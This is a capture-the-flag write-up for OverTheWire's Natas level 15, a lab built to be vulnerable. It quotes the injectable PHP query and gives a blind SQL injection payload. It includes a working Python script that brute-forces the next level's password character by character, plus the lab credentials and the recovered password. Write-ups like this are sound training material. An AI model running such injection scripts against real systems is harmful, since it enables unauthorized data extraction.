# Natas Level 14 --> Level 15

**Username:** natas15

**Password:** AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

**URL:**      http://natas15.natas.labs.overthewire.org

 
**Solved with my best friend [Wasfy Elbaz](github.com/wasfyelbaz/)**

## Solution
* Click view sourcecode there you can see the query they use to access, there isn't anything special so we can inject simple code to bypass.
```
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```
* Try enter 'natas16' as username the response will be:
```
This user exists.
```
* So we need to get this username's password to solve this level.
* We can guess the password char by char using LIKE query
```
natas16" AND password LIKE BINARY "{char}%
``` 
* Write python script brute-force requests to get the password consist of 32 chars (like all natas passwords)
```python
import requests
import string

CHARS = list(string.ascii_lowercase + string.ascii_uppercase + "0123456789")

USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"

headers = {
    'dnt': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': USER_AGENT,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'host': 'natas15.natas.labs.overthewire.org',
    'accept-Encoding': 'gzip, deflate',
    'origin': 'http://natas15.natas.labs.overthewire.org',
    'authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==',
    'connection': 'close',
    'referer': 'http://natas15.natas.labs.overthewire.org/',
    'sec-gpc': '1'
}

payload = ""
while len(payload) < 32:
  for char in CHARS:
    print(f"\rCurrent Char: {char} | Payload: {payload}", end="")
    url = f"http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+and+password+like+binary+%22{payload}{char}%&debug=1"
    response = requests.get(url, headers=headers)
    if "This user exists" in response.content.decode():
      payload += char
      break
```
```bash
┌─[darkknight@dark]─[~]
└──╼ $python3 blind_sql_user_gussing.py 
Current Char: h | Payload: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

```
* You got the password!!

> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
